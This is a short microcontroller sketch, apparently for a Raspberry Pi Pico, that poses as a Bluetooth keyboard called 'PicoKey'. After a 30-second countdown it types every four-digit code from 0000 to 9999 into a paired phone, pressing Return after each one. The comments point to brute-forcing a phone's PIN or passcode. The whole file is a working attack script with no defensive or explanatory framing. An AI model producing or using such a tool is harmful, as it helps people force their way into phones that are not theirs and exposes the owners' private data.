#include <KeyboardBLE.h>

const int LED = LED_BUILTIN;

void setup() {
  pinMode(LED, OUTPUT);

  // Starts serial
  Serial.begin(115200);
  // Small delay to let PC serial monitor connect if plugged in
  delay(1000);

  // start BLE keyboard
  KeyboardBLE.begin("PicoKey");

  // 30 second safety countdown
  for (int i = 0; i < 30; i++) {
    digitalWrite(LED, HIGH);
    delay(500);
    digitalWrite(LED, LOW);
    delay(500);
  }
  digitalWrite(LED, HIGH);

  // Run combinations
  for (int i = 0; i < 10000; i++) {
    char combo[5];
    snprintf(combo, sizeof(combo), "%04d", i);

    // Send over BLE to the phone
    KeyboardBLE.print(combo);
    KeyboardBLE.write(KEY_RETURN);

    // Mirror to PC serial (if itsconnected)
    Serial.println(combo);

    delay(500);
  }

  digitalWrite(LED, LOW);
}

void loop() {
  delay(1000);
}